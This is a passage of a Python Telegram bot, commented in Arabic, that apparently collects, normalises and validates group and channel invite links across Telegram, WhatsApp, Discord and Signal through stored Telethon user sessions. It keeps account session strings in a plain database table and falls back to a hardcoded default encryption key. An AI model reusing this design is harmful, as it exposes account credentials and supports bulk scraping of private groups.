import os
import sys
import subprocess
import signal
import atexit

# 🔧 FIX FOR RENDER: تحديث جميع الحزم وتثبيت الإصدارات المتوافقة
def ensure_packages():
    """تأكد من تثبيت جميع الحزم المطلوبة"""
    required = [
        'python-telegram-bot[job-queue]==20.7',
        'Telethon==1.34.0', 
        'aiosqlite==0.19.0',
        'aiofiles==23.2.1',
        'cryptography==42.0.5',
        'psutil==5.9.8',
        'aiohttp==3.11.3',
        'fastapi==0.104.1',
        'uvicorn[standard]==0.24.0',
        'httpx==0.25.2',
        'pytz==2023.3',
        'apscheduler==3.10.4',
        'redis==5.0.1'
    ]
    
    for package in required:
        pkg_name = package.split('==')[0]
        try:
            __import__(pkg_name.replace('-', '_'))
        except ImportError:
            print(f"📦 جاري تثبيت {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# تشغيل فحص الحزم
ensure_packages()

# استيراد المكتبات بعد التثبيت
import asyncio
import logging
import re
import json
import aiofiles
import aiosqlite
import gc
import shutil
import hashlib
import psutil
import secrets
import base64
import traceback
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime, timedelta
from collections import OrderedDict, defaultdict, deque
from urllib.parse import urlparse, parse_qs, urlencode
import aiohttp
from contextlib import asynccontextmanager
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
    ApplicationBuilder,
    ConversationHandler
)
from telegram.error import TelegramError, Conflict
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl import functions, types
from telethon.errors import (
    FloodWaitError, ChannelPrivateError, UsernameNotOccupiedError,
    InviteHashInvalidError, InviteHashExpiredError, ChatAdminRequiredError,
    SessionPasswordNeededError, PhoneCodeInvalidError, AuthKeyError,
    UserNotParticipantError, ChatWriteForbiddenError
)

# ======================
# Configuration - تهيئة الإعدادات
# ======================

class Config:
    # Telegram API Credentials - بيانات التليجرام
    BOT_TOKEN = os.getenv("BOT_TOKEN", "")
    API_ID = int(os.getenv("API_ID", 0))
    API_HASH = os.getenv("API_HASH", "")
    
    # Security - الأمان
    @staticmethod
    def safe_parse_ids(env_var, default="0"):
        try:
            value = os.getenv(env_var, default)
            if not value or value.strip() == "":
                return {int(default)}
            
            ids = []
            for id_str in value.split(","):
                id_str = id_str.strip()
                if id_str:
                    ids.append(int(id_str))
            
            if not ids:
                return {int(default)}
            
            return set(ids)
        except (ValueError, TypeError):
            return {int(default)}

    ADMIN_USER_IDS = safe_parse_ids("ADMIN_USER_IDS", "0")
    ALLOWED_USER_IDS = safe_parse_ids("ALLOWED_USER_IDS", "0")
    
    # Encryption - التشفير
    ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY", "default_encryption_key_32_chars_long!")
    
    # Memory management - إدارة الذاكرة
    MAX_CACHED_URLS = 20000
    CACHE_CLEAN_INTERVAL = 1000
    MAX_MEMORY_MB = 500
    
    # Performance settings - إعدادات الأداء
    MAX_CONCURRENT_SESSIONS = 20
    REQUEST_DELAYS = {
        'normal': 1.0,
        'join_request': 5.0,
        'search': 2.0,
        'flood_wait': 5.0,
        'between_sessions': 2.0,
        'between_tasks': 0.3,
        'min_cycle_delay': 10.0,
        'max_cycle_delay': 45.0,
        'validation_delay': 2.0
    }
    
    # Collection limits - حدود الجمع
    MAX_DIALOGS_PER_SESSION = 50
    MAX_MESSAGES_PER_SEARCH = 10
    MAX_SEARCH_TERMS = 8
    MAX_LINKS_PER_CYCLE = 200
    MAX_BATCH_SIZE = 50
    
    # Database - قاعدة البيانات
    DB_PATH = "links_collector.db"
    BACKUP_ENABLED = True
    MAX_BACKUPS = 10
    DB_POOL_SIZE = 5
    
    # WhatsApp collection - جمع واتساب
    WHATSAPP_DAYS_BACK = 30
    
    # Link verification - التحقق من الروابط
    MIN_GROUP_MEMBERS = 3
    MAX_LINK_LENGTH = 200
    VALIDATION_TIMEOUT = 30
    
    # Rate limiting - الحد من الطلبات
    USER_RATE_LIMIT = {
        'max_requests': 15,
        'per_seconds': 60
    }
    
    # Session management - إدارة الجلسات
    SESSION_TIMEOUT = 600
    MAX_SESSIONS_PER_USER = 20
    
    # Export - التصدير
    MAX_EXPORT_LINKS = 100000
    EXPORT_CHUNK_SIZE = 5000
    
    # Advanced settings - إعدادات متقدمة
    TELEGRAM_NO_TIME_LIMIT = True
    JOIN_REQUEST_CHECK_DELAY = 30
    ENABLE_ADVANCED_VALIDATION = True
    
    # Render settings
    PORT = int(os.getenv("PORT", 10000))
    WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")
    USE_WEBHOOK = bool(WEBHOOK_URL)

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(name)s | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger(__name__)

# ======================
# Enhanced Link Processor - معالج الروابط المحسن
# ======================

class EnhancedLinkProcessor:
    """معالجة روابط متقدمة مع تحسين كشف تيليجرام"""
    
    TRACKING_PARAMS = [
        'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content',
        'ref', 'source', 'campaign', 'medium', 'term', 'content',
        'fbclid', 'gclid', 'msclkid', 'dclid', 'igshid',
        'si', 's', 't', 'mibextid'
    ]
    
    ALLOWED_DOMAINS = [
        't.me', 'telegram.me', 'telegram.dog',
        'chat.whatsapp.com', 'whatsapp.com',
        'discord.gg', 'discord.com',
        'signal.group'
    ]
    
    @staticmethod
    def normalize_url(url: str, aggressive: bool = False) -> str:
        """توحيد الرابط مع معالجة تيليجرام محسنة"""
        if not url or not isinstance(url, str):
            return ""
        
        original_url = url
        
        # إزالة المسافات والرموز غير المرغوبة
        url = url.strip()
        url = re.sub(r'^["\'\s*]+|["\'\s*]+$', '', url)
        url = re.sub(r'[,\s]+$', '', url)
        
        # استخراج الرابط من النص
        url_patterns = [
            r'(https?://[^\s<>]+)',
            r'(t\.me/[^\s<>]+)',
            r'(telegram\.me/[^\s<>]+)',
            r'(chat\.whatsapp\.com/[^\s<>]+)',
            r'(discord\.gg/[^\s<>]+)',
            r'(signal\.group/[^\s<>]+)'
        ]
        
        extracted_url = None
        for pattern in url_patterns:
            match = re.search(pattern, url, re.IGNORECASE)
            if match:
                extracted_url = match.group(1)
                break
        
        if extracted_url:
            url = extracted_url
        
        # إضافة https إذا كانت مفقودة
        if not url.startswith(('http://', 'https://')):
            if any(domain in url for domain in EnhancedLinkProcessor.ALLOWED_DOMAINS):
                url = 'https://' + url.lstrip('/')
        
        # تحليل الرابط
        try:
            parsed = urlparse(url)
            
            # التحقق من النطاق المسموح
            domain = parsed.netloc.lower()
            allowed = any(allowed_domain in domain for allowed_domain in EnhancedLinkProcessor.ALLOWED_DOMAINS)
            
            if not allowed and not aggressive:
                logger.debug(f"النطاق غير مسموح: {domain}")
                return ""
            
            # إزالة معاملات التتبع
            query_params = []
            if parsed.query:
                params = parse_qs(parsed.query, keep_blank_values=True)
                filtered_params = {}
                
                for key, values in params.items():
                    key_lower = key.lower()
                    is_tracking = False
                    
                    for tracking_param in EnhancedLinkProcessor.TRACKING_PARAMS:
                        if tracking_param in key_lower:
                            is_tracking = True
                            break
                    
                    if not is_tracking and key:
                        filtered_params[key] = values[0] if values else ''
                
                if filtered_params:
                    query_params.append(urlencode(filtered_params, doseq=True))
            
            # إعادة بناء المسار
            path = parsed.path
            
            # معالجة خاصة لروابط تيليجرام
            if 't.me' in domain or 'telegram.' in domain:
                # الحفاظ على جميع أجزاء المسار لروابط تيليجرام
                path_parts = path.strip('/').split('/')
                if len(path_parts) >= 1:
                    # إزالة المسارات الزائدة فقط للمسارات الطويلة جداً
                    if len(path_parts) > 4:
                        path = '/' + '/'.join(path_parts[:4])
            
            # إعادة بناء الرابط
            clean_url = f"{parsed.scheme}://{parsed.netloc}{path}"
            if query_params:
                clean_url += f"?{'&'.join(query_params)}"
            if parsed.fragment and not aggressive:
                clean_url += f"#{parsed.fragment}"
            
            # إزالة الشرطة المائلة الأخيرة
            if clean_url.endswith('/'):
                clean_url = clean_url[:-1]
            
            return clean_url.lower()
            
        except Exception as e:
            logger.debug(f"خطأ في توحيد الرابط {original_url}: {e}")
            # محاولة تنظيف بسيط
            url = re.sub(r'[?#].*$', '', url)
            if url.endswith('/'):
                url = url[:-1]
            return url.lower()
    
    @staticmethod
    def extract_url_info(url: str) -> Dict:
        """استخراج معلومات شاملة مع كشف تيليجرام محسن"""
        normalized_url = EnhancedLinkProcessor.normalize_url(url)
        
        result = {
            'original_url': url,
            'normalized_url': normalized_url,
            'platform': 'unknown',
            'url_hash': hashlib.md5(normalized_url.encode()).hexdigest() if normalized_url else '',
            'is_valid': False,
            'details': {}
        }
        
        if not normalized_url:
            return result
        
        try:
            parsed = urlparse(normalized_url)
            domain = parsed.netloc.lower()
            
            # تحديد المنصة
            if 't.me' in domain or 'telegram.' in domain:
                result['platform'] = 'telegram'
                result['details'] = EnhancedLinkProcessor._extract_telegram_info_enhanced(normalized_url, parsed)
            elif 'whatsapp.com' in domain:
                result['platform'] = 'whatsapp'
                result['details'] = EnhancedLinkProcessor._extract_whatsapp_info(normalized_url, parsed)
            elif 'discord.' in domain:
                result['platform'] = 'discord'
                result['details'] = EnhancedLinkProcessor._extract_discord_info(normalized_url, parsed)
            elif 'signal.group' in domain:
                result['platform'] = 'signal'
                result['details'] = EnhancedLinkProcessor._extract_signal_info(normalized_url, parsed)
            
            result['is_valid'] = bool(result['details'].get('is_valid', False))
            
        except Exception as e:
            logger.debug(f"خطأ في استخراج معلومات الرابط: {e}")
        
        return result
    
    @staticmethod
    def _extract_telegram_info_enhanced(url: str, parsed) -> Dict:
        """استخراج معلومات تيليجرام خاصة مع كشف محسن"""
        result = {
            'is_valid': False,
            'username': '',
            'invite_hash': '',
            'is_channel': False,
            'is_group': False,
            'is_join_request': False,
            'is_public': False,
            'is_private': False,
            'is_supergroup': False,
            'is_broadcast': False,
            'path_segments': [],
            'is_active': True
        }
        
        path = parsed.path.strip('/')
        if not path:
            return result
        
        segments = path.split('/')
        result['path_segments'] = segments
        
        # كشف روابط الانضمام (joinchat)
        join_patterns = [
            r'\+(?:joinchat/)?([A-Za-z0-9_-]+)',
            r'joinchat/([A-Za-z0-9_-]+)',
            r'join/([A-Za-z0-9_-]+)'
        ]
        
        join_hash = None
        for pattern in join_patterns:
            match = re.search(pattern, url, re.IGNORECASE)
            if match:
                join_hash = match.group(1)
                break
        
        if join_hash:
            result['is_join_request'] = True
            result['is_private'] = True
            result['invite_hash'] = join_hash
            result['is_valid'] = True
            result['is_group'] = True
            
            if 'channel' in url.lower() or 'c/' in url.lower():
                result['is_channel'] = True
                result['is_group'] = False
            return result
        
        # كشف القنوات
        channel_patterns = [
            r'c/([^/]+)',
            r'channel/([^/]+)',
            r's/([^/]+)'
        ]
        
        channel_name = None
        for pattern in channel_patterns:
            match = re.search(pattern, url, re.IGNORECASE)
            if match:
                channel_name = match.group(1)
                result['is_channel'] = True
                result['is_broadcast'] = True
                result['is_valid'] = True
                result['username'] = channel_name
                return result
        
        # كشف المجموعات العامة
        if len(segments) == 1:
            username = segments[0].lower()
            result['username'] = username
            
            if username.startswith('+'):
                result['is_join_request'] = True
                result['is_private'] = True
                result['invite_hash'] = username[1:]
                result['is_group'] = True
                result['is_valid'] = True
            else:
                result['is_group'] = True
                result['is_public'] = True
                result['is_valid'] = True
                result['is_supergroup'] = True
        
        elif len(segments) >= 2:
            if segments[0].lower() in ['c', 'channel', 's']:
                result['is_channel'] = True
                result['is_broadcast'] = True
                result['is_valid'] = True
            elif segments[0].lower() == 'joinchat':
                result['is_join_request'] = True
                result['is_private'] = True
                result['invite_hash'] = segments[1] if len(segments) > 1 else ''
                result['is_group'] = True
                result['is_valid'] = True
            else:
                result['is_group'] = True
                result['is_public'] = True
                result['is_supergroup'] = True
                result['is_valid'] = True
        
        return result
    
    @staticmethod
    def _extract_whatsapp_info(url: str, parsed) -> Dict:
        """استخراج معلومات واتساب خاصة"""
        return {
            'is_valid': True,
            'invite_code': parsed.path.strip('/'),
            'is_group': True
        }
    
    @staticmethod
    def _extract_discord_info(url: str, parsed) -> Dict:
        """استخراج معلومات ديسكورد خاصة"""
        return {
            'is_valid': True,
            'invite_code': parsed.path.strip('/'),
            'is_invite': True
        }
    
    @staticmethod
    def _extract_signal_info(url: str, parsed) -> Dict:
        """استخراج معلومات سيجنال خاصة"""
        return {
            'is_valid': True,
            'group_code': parsed.path.strip('/'),
            'is_group': True
        }
    
    @staticmethod
    async def validate_telegram_link_advanced(client: TelegramClient, url: str, check_join_request: bool = False) -> Dict:
        """تحقق متقدم لروابط تيليجرام"""
        try:
            url_info = EnhancedLinkProcessor.extract_url_info(url)
            details = url_info.get('details', {})
            
            result = {
                'is_valid': False,
                'is_active': False,
                'type': 'unknown',
                'title': '',
                'members': 0,
                'requires_join': details.get('is_join_request', False),
                'is_verified': False,
                'validation_score': 0,
                'reason': '',
                'method': 'advanced',
                'is_channel': details.get('is_channel', False),
                'is_group': details.get('is_group', False),
                'is_supergroup': details.get('is_supergroup', False)
            }
            
            if not url_info['is_valid']:
                result['reason'] = 'رابط غير صالح'
                return result
            
            if details.get('is_join_request') and check_join_request:
                try:
                    invite_hash = details.get('invite_hash', '')
                    if invite_hash:
                        invite = await client(functions.messages.CheckChatInviteRequest(
                            hash=invite_hash
                        ))
                        
                        if isinstance(invite, types.ChatInviteAlready):
                            result['is_valid'] = True
                            result['is_active'] = True
                            result['type'] = 'join_request_already_member'
                            result['is_verified'] = True
                            result['validation_score'] = 85
                        elif isinstance(invite, types.ChatInvite):
                            result['is_valid'] = True
                            result['is_active'] = True
                            result['type'] = 'join_request_valid'
                            result['title'] = invite.title
                            result['members'] = invite.participants_count
                            result['is_verified'] = True
                            result['validation_score'] = 90
                        elif isinstance(invite, types.ChatInvitePeek):
                            result['is_valid'] = True
                            result['is_active'] = True
                            result['type'] = 'join_request_peek'
                            result['title'] = invite.chat.title
                            result['is_verified'] = True
                            result['validation_score'] = 80
                    else:
                        result['reason'] = 'لا يوجد رمز دعوة'
                except InviteHashInvalidError:
                    result['reason'] = 'رابط دعوة غير صالح'
                except InviteHashExpiredError:
                    result['reason'] = 'رابط دعوة منتهي'
                except Exception as e:
                    result['reason'] = f'خطأ في التحقق: {str(e)[:50]}'
            
            elif details.get('is_public') or details.get('username'):
                username = details.get('username', '')
                if username:
                    try:
                        entity = await client.get_entity(username)
                        
                        if isinstance(entity, types.Channel):
                            if entity.broadcast:
                                result['type'] = 'channel'
                                result['is_channel'] = True
                            else:
                                result['type'] = 'supergroup' if entity.megagroup else 'group'
                                result['is_group'] = True
                                result['is_supergroup'] = entity.megagroup
                        elif isinstance(entity, types.Chat):
                            result['type'] = 'group'
                            result['is_group'] = True
                        
                        result['is_valid'] = True
                        result['is_active'] = True
                        result['title'] = getattr(entity, 'title', '')
                        result['members'] = getattr(entity, 'participants_count', 0)
                        result['is_verified'] = True
                        result['validation_score'] = 95
                        
                    except UsernameNotOccupiedError:
                        result['reason'] = 'المستخدم/المجموعة غير موجودة'
                    except ChannelPrivateError:
                        result['reason'] = 'القناة/المجموعة خاصة'
                    except Exception as e:
                        result['reason'] = f'خطأ في الوصول: {str(e)[:50]}'
            
            else:
                result['is_valid'] = True
                result['is_active'] = True
                result['type'] = 'unknown'
                result['validation_score'] = 50
            
            return result
            
        except Exception as e:
            logger.error(f"خطأ في التحقق المتقدم للرابط: {e}")
            return {
                'is_valid': False,
                'is_active': False,
                'type': 'error',
                'reason': f'خطأ في التحقق: {str(e)[:50]}',
                'validation_score': 0
            }

# ======================
# Enhanced Database Manager - مدير قاعدة البيانات المحسن
# ======================

class EnhancedDatabaseManager:
    """إدارة قاعدة بيانات متقدمة مع معالجة روابط محسنة"""
    
    _instance = None
    _initialized = False
    
    @classmethod
    async def get_instance(cls):
        """الحصول على مثيل قاعدة البيانات"""
        if cls._instance is None:
            cls._instance = EnhancedDatabaseManager()
            await cls._instance._initialize()
        return cls._instance
    
    async def _initialize(self):
        """تهيئة قاعدة البيانات"""
        if self._initialized:
            return
        
        self.db_path = Config.DB_PATH
        os.makedirs(os.path.dirname(self.db_path) if os.path.dirname(self.db_path) else '.', exist_ok=True)
        
        self.conn = await aiosqlite.connect(self.db_path)
        await self._create_tables()
        
        self._initialized = True
        logger.info(f"تم تهيئة قاعدة البيانات: {self.db_path}")
    
    async def _create_tables(self):
        """إنشاء جداول قاعدة البيانات"""
        await self.conn.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_string TEXT UNIQUE NOT NULL,
                session_hash TEXT NOT NULL,
                phone_number TEXT,
                user_id INTEGER,
                username TEXT,
                display_name TEXT,
                added_by_user INTEGER,
                is_active BOOLEAN DEFAULT 1,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                last_success TIMESTAMP,
                total_uses INTEGER DEFAULT 0,
                total_links INTEGER DEFAULT 0,
                status TEXT DEFAULT 'active',
                health_score INTEGER DEFAULT 100,
                notes TEXT,
                metadata TEXT,
                CONSTRAINT unique_session_hash UNIQUE(session_hash)
            )
        ''')
        
        await self.conn.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url_hash TEXT UNIQUE NOT NULL,
                url TEXT NOT NULL,
                original_url TEXT,
                platform TEXT NOT NULL,
                link_type TEXT,
                telegram_type TEXT,
                title TEXT,
                description TEXT,
                members_count INTEGER DEFAULT 0,
                session_id INTEGER,
                collected_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_checked TIMESTAMP,
                check_count INTEGER DEFAULT 0,
                confidence TEXT DEFAULT 'medium',
                is_active BOOLEAN DEFAULT 1,
                requires_join BOOLEAN DEFAULT 0,
                is_verified BOOLEAN DEFAULT 0,
                validation_score INTEGER DEFAULT 0,
                metadata TEXT,
                tags TEXT,
                added_by_user INTEGER,
                source TEXT,
                is_channel BOOLEAN DEFAULT 0,
                is_group BOOLEAN DEFAULT 0,
                is_join_request BOOLEAN DEFAULT 0,
                is_supergroup BOOLEAN DEFAULT 0,
                FOREIGN KEY (session_id) REFERENCES sessions (id) ON DELETE SET NULL,
                CONSTRAINT unique_url_hash UNIQUE(url_hash)
            )
        ''')
        
        await self.conn.execute('''
            CREATE TABLE IF NOT EXISTS bot_users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                is_admin BOOLEAN DEFAULT 0,
                is_allowed BOOLEAN DEFAULT 1,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                request_count INTEGER DEFAULT 0,
                session_count INTEGER DEFAULT 0,
                link_count INTEGER DEFAULT 0,
                total_links_added INTEGER DEFAULT 0,
                last_command TEXT,
                settings TEXT
            )
        ''')
        
        await self.conn.execute('''
            CREATE TABLE IF NOT EXISTS collection_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_uid TEXT UNIQUE NOT NULL,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                end_time TIMESTAMP,
                status TEXT DEFAULT 'running',
                stats TEXT,
                duration_seconds INTEGER,
                user_id INTEGER,
                metadata TEXT
            )
        ''')
        
        # إنشاء الفهارس
        await self.conn.execute('CREATE INDEX IF NOT EXISTS idx_links_url_hash ON links(url_hash)')
        await self.conn.execute('CREATE INDEX IF NOT EXISTS idx_links_platform_type ON links(platform, link_type)')
        await self.conn.execute('CREATE INDEX IF NOT EXISTS idx_links_collected_date ON links(collected_date)')
        await self.conn.execute('CREATE INDEX IF NOT EXISTS idx_sessions_active ON sessions(is_active, health_score)')
        
        await self.conn.commit()
    
    async def add_link_enhanced(self, link_info: Dict) -> Tuple[bool, str, Dict]:
        """إضافة رابط مع معلومات تيليجرام محسنة"""
        try:
            url = link_info.get('url', '')
            url_info = EnhancedLinkProcessor.extract_url_info(url)
            
            if not url_info['is_valid']:
                return False, "رابط غير صالح", {}
            
            details = url_info['details']
            
            cursor = await self.conn.execute(
                'SELECT id FROM links WHERE url_hash = ?',
                (url_info['url_hash'],)
            )
            existing = await cursor.fetchone()
            
            if existing:
                return False, "الرابط موجود مسبقاً", {'link_id': existing[0]}
            
            link_data = {
                'url_hash': url_info['url_hash'],
                'url': url_info['normalized_url'],
                'original_url': url_info['original_url'],
                'platform': url_info['platform'],
                'link_type': link_info.get('link_type', 'unknown'),
                'telegram_type': details.get('telegram_type', ''),
                'title': link_info.get('title', '')[:500],
                'description': link_info.get('description', '')[:1000],
                'members_count': link_info.get('members', 0),
                'session_id': link_info.get('session_id'),
                'confidence': link_info.get('confidence', 'medium'),
                'is_active': link_info.get('is_active', True),
                'requires_join': details.get('requires_join', False) or details.get('is_join_request', False),
                'is_verified': link_info.get('is_verified', False),
                'validation_score': link_info.get('validation_score', 0),
                'metadata': json.dumps(link_info.get('metadata', {})),
                'tags': json.dumps(link_info.get('tags', [])),
                'added_by_user': link_info.get('added_by_user', 0),
                'source': link_info.get('source', 'manual'),
                'is_channel': details.get('is_channel', False),
                'is_group': details.get('is_group', True),
                'is_join_request': details.get('is_join_request', False),
                'is_supergroup': details.get('is_supergroup', False)
            }
            
            cursor = await self.conn.execute('''
                INSERT INTO links 
                (url_hash, url, original_url, platform, link_type, telegram_type, title, 
                 description, members_count, session_id, collected_date, confidence, 
                 is_active, requires_join, is_verified, validation_score, metadata, 
                 tags, added_by_user, source, is_channel, is_group, is_join_request, is_supergroup)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                link_data['url_hash'],
                link_data['url'],
                link_data['original_url'],
                link_data['platform'],
                link_data['link_type'],
                link_data['telegram_type'],
                link_data['title'],
                link_data['description'],
                link_data['members_count'],
                link_data['session_id'],
                link_data['confidence'],
                link_data['is_active'],
                link_data['requires_join'],
                link_data['is_verified'],
                link_data['validation_score'],
                link_data['metadata'],
                link_data['tags'],
                link_data['added_by_user'],
                link_data['source'],
                link_data['is_channel'],
                link_data['is_group'],
                link_data['is_join_request'],
                link_data['is_supergroup']
            ))
            
            link_id = cursor.lastrowid
            
            await self.conn.commit()
            
            if link_data['added_by_user']:
                await self.update_user_stats(link_data['added_by_user'], 'link_added')
            
            return True, "تمت إضافة الرابط بنجاح", {
                'link_id': link_id,
                'url_hash': url_info['url_hash']
            }
            
        except Exception as e:
            logger.error(f"خطأ في إضافة الرابط المحسن: {e}", exc_info=True)
            return False, f"خطأ في الإضافة: {str(e)[:100]}", {}
    
    async def add_or_update_user(self, user_id: int, username: str = None, 
                                first_name: str = None, last_name: str = None):
        """إضافة أو تحديث مستخدم"""
        try:
            cursor = await self.conn.execute(
                'SELECT user_id FROM bot_users WHERE user_id = ?',
                (user_id,)
            )
            
            existing = await cursor.fetchone()
            
            if existing:
                await self.conn.execute('''
                    UPDATE bot_users 
                    SET username = ?, 
                        first_name = ?, 
                        last_name = ?,
                        last_active = CURRENT_TIMESTAMP
                    WHERE user_id = ?
                ''', (
                    username or '',
                    first_name or '',
                    last_name or '',
                    user_id
                ))
            else:
                await self.conn.execute('''
                    INSERT INTO bot_users (user_id, username, first_name, last_name, added_date)
                    VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
                ''', (
                    user_id,
                    username or '',
                    first_name or '',
                    last_name or ''
                ))
            
            await self.conn.commit()
        except Exception as e:
            logger.error(f"خطأ في إضافة/تحديث المستخدم: {e}")
    
    async def get_user_stats(self, user_id: int):
        """الحصول على إحصائيات المستخدم"""
        try:
            cursor = await self.conn.execute('''
                SELECT *, 
                       (SELECT COUNT(*) FROM links WHERE added_by_user = ?) as total_links,
                       (SELECT COUNT(*) FROM sessions WHERE added_by_user = ?) as total_sessions,
                       julianday(CURRENT_TIMESTAMP) - julianday(added_date) as account_age_days
                FROM bot_users 
                WHERE user_id = ?
            ''', (user_id, user_id, user_id))
            
            row = await cursor.fetchone()
            if row:
                columns = [desc[0] for desc in cursor.description]
                return dict(zip(columns, row))
            return None
        except Exception as e:
            logger.error(f"خطأ في الحصول على إحصائيات المستخدم: {e}")
            return None
    
    async def update_user_stats(self, user_id: int, action: str, value: int = 1):
        """تحديث إحصائيات المستخدم"""
        try:
            update_query = '''
                UPDATE bot_users 
                SET last_active = CURRENT_TIMESTAMP,
                    request_count = request_count + 1
            '''
            params = []
            
            if action == 'session_added':
                update_query += ', session_count = session_count + 1'
            elif action == 'link_added':
                update_query += ', link_count = link_count + ?, total_links_added = total_links_added + ?'
                params.extend([value, value])
            
            update_query += ' WHERE user_id = ?'
            params.append(user_id)
            
            await self.conn.execute(update_query, params)
            await self.conn.commit()
            
        except Exception as e:
            logger.debug(f"خطأ في تحديث إحصائيات المستخدم: {e}")
    
    async def get_stats_summary_enhanced(self, detailed: bool = False) -> Dict:
        """الحصول على إحصائيات قاعدة بيانات شاملة"""
        try:
            stats = {}
            
            cursor = await self.conn.execute("SELECT COUNT(*) FROM links")
            stats['total_links'] = (await cursor.fetchone())[0]
            
            cursor = await self.conn.execute("SELECT COUNT(*) FROM sessions WHERE is_active = 1")
            stats['active_sessions'] = (await cursor.fetchone())[0]
            
            cursor = await self.conn.execute("SELECT COUNT(*) FROM bot_users")
            stats['total_users'] = (await cursor.fetchone())[0]
            
            cursor = await self.conn.execute(
                "SELECT platform, COUNT(*) FROM links GROUP BY platform ORDER BY COUNT(*) DESC"
            )
            stats['links_by_platform'] = dict(await cursor.fetchall())
            
            cursor = await self.conn.execute('''
                SELECT 
                    telegram_type,
                    is_channel,
                    is_group,
                    is_supergroup,
                    is_join_request,
                    COUNT(*) as count
                FROM links 
                WHERE platform = 'telegram' 
                GROUP BY telegram_type, is_channel, is_group, is_supergroup, is_join_request
                ORDER BY count DESC
            ''')
            
            telegram_details = []
            for row in await cursor.fetchall():
                telegram_details.append({
                    'type': row[0] or 'unknown',
                    'is_channel': bool(row[1]),
                    'is_group': bool(row[2]),
                    'is_supergroup': bool(row[3]),
                    'is_join_request': bool(row[4]),
                    'count': row[5]
                })
            
            stats['telegram_details'] = telegram_details
            
            return stats
            
        except Exception as e:
            logger.error(f"خطأ في الحصول على ملخص الإحصائيات المحسن: {e}", exc_info=True)
            return {}
    
    async def close(self):
        """إغلاق اتصال قاعدة البيانات"""
        if hasattr(self, 'conn') and self.conn:
            await self.conn.close()
            self._initialized = False

# ======================
# Advanced Collection Manager - مدير الجمع المتقدم
# ======================

class AdvancedCollectionManager:
    """إدارة جمع متقدمة بدون قيود زمنية لتيليجرام"""
    
    def __init__(self):
        self.active = False
        self.paused = False
        self.stop_requested = False
        self.stats = {
            'total_collected': 0,
            'telegram_public': 0,
            'telegram_private': 0,
            'telegram_join': 0,
            'telegram_channels': 0,
            'telegram_supergroups': 0,
            'telegram_groups': 0,
            'whatsapp_groups': 0,
            'discord_invites': 0,
            'signal_groups': 0,
            'duplicates': 0,
            'errors': 0,
            'flood_waits': 0,
            'join_links_found': 0,
            'join_links_validated': 0,
            'start_time': None,
            'end_time': None,
            'cycles_completed': 0,
            'current_session': None,
            'performance_score': 100.0
        }
        
        self.whatsapp_cutoff = datetime.now() - timedelta(days=Config.WHATSAPP_DAYS_BACK)
    
    async def start_collection(self, mode: str = 'balanced'):
        """بدء عملية الجمع المتقدمة"""
        self.active = True
        self.paused = False
        self.stop_requested = False
        self.stats['start_time'] = datetime.now()
        self.stats['cycles_completed'] = 0
        self.stats['current_session'] = self.stats['start_time'].strftime('%Y%m%d_%H%M%S')
        
        logger.info(f"🚀 بدء عملية الجمع الذكية المتقدمة")
        
        try:
            while self.active and not self.stop_requested:
                if self.paused:
                    await asyncio.sleep(1)
                    continue
                
                await self._collection_cycle()
                
                if self.active and not self.stop_requested:
                    await asyncio.sleep(Config.REQUEST_DELAYS['min_cycle_delay'])
        
        except Exception as e:
            logger.error(f"❌ خطأ في عملية الجمع المتقدمة: {e}", exc_info=True)
            self.stats['errors'] += 1
        
        finally:
            await self._graceful_shutdown()
    
    async def _collection_cycle(self):
        """تنفيذ دورة جمع"""
        cycle_start = datetime.now()
        
        try:
            db = await EnhancedDatabaseManager.get_instance()
            
            # في هذه النسخة المبسطة، سنقوم بمحاكاة الجمع
            collected_links = await self._simulate_collection()
            
            for link_info in collected_links:
                success, message, details = await db.add_link_enhanced(link_info)
                if success:
                    self._update_stats(link_info)
            
            self.stats['cycles_completed'] += 1
            
            cycle_duration = (datetime.now() - cycle_start).total_seconds()
            logger.info(f"اكتملت دورة الجمع: {len(collected_links)} روابط - مدة: {cycle_duration:.2f} ثانية")
            
        except Exception as e:
            logger.error(f"خطأ في دورة الجمع: {e}")
            self.stats['errors'] += 1
    
    async def _simulate_collection(self) -> List[Dict]:
        """محاكاة عملية الجمع (للتوضيح)"""
        collected = []
        
        # روابط تيليجرام عشوائية
        telegram_links = [
            "https://t.me/testgroup",
            "https://t.me/+AbCdEfGhIjKlMnOp",
            "https://t.me/channel_test",
            "https://telegram.me/arabicgroup",
            "https://t.me/joinchat/ABCDEFGHIJKLMNOP"
        ]
        
        for url in telegram_links:
            collected.append({
                'url': url,
                'link_type': 'group',
                'title': f'مجموعة اختبار {secrets.token_hex(4)}',
                'members': secrets.randbelow(1000) + 100,
                'session_id': 1,
                'added_by_user': 0,
                'confidence': 'high',
                'is_active': True,
                'is_verified': True,
                'validation_score': 90,
